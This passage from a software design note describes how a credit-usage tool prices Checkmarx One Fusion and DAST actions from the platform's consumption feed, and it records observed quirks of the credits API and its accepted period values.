   recorded verbatim and only used, best effort, for the Simulation's *may not
   hold* warning. That a project cannot override an account-wide ("select
   all") setting is concluded from two read-backs, not from this field.

**Fusion and DAST pricing.** `GET /api/v1/credits/action-rates` lists a
`credits_per_action` that, on a live tenant (2026-11), was the cost of one
transaction for triage (1) and remediation (3) only. The consumption feed
reported 31,024 credits for 285 Opus 5.5 Fusion transactions (about 108.9 each,
rate 2), about 7.65 per Opus 4.7 transaction (rate 2.5), about 5.4 per Haiku 4.5
(rate 1.5) and 1,568 credits for 10 DAST correlations (about 156.8, rate 14).
So a price is the listed rate only when the feed's own credits / transactions
(action dimension) agree with it within 10%; otherwise the feed's average is
used, and every message and the Overview's table say which. With no feed figure
triage and remediation are priced at their rate, but Fusion and DAST correlation
are not priced at all: the breach and violation messages and the Overview say
their cost per scan is not known from this tenant's data.

**Other live-tenant observations.** `creditsUsed` arrives as a string
(`"31024"`, `"252.5"`); no consumption row carries an id (matching is by name,
the id branch is for payloads that may add one); action rows nest the type and
count under `actionsPerformed` like every other dimension; the user dimension
lists the same person more than once (119 rows for 87 subjects), which is
merged; `/credits/info` carries Checkmarx's own `enforcement` block (state and
thresholds), shown read only on the Overview. Checkmarx One applies the API key
owner's roles server-side: a token carrying only IAM roles was allowed every
platform read.

Settled since the first draft: the `period` parameter accepts exactly
`last_month`, `last_30_days`, `last_90_days`, `last_180_days` and `last_year`, all
verified against a live tenant. Anything else is a 400, so the Settings page offers
them as a list and the API rejects the rest rather than letting ingestion break
silently.

Everything that knows the shape of the consumption payload lives in
`app/checkmarx/usage.py`, and the project toggles live in
`app/checkmarx/platform.py`, so each of these is a single file edit.
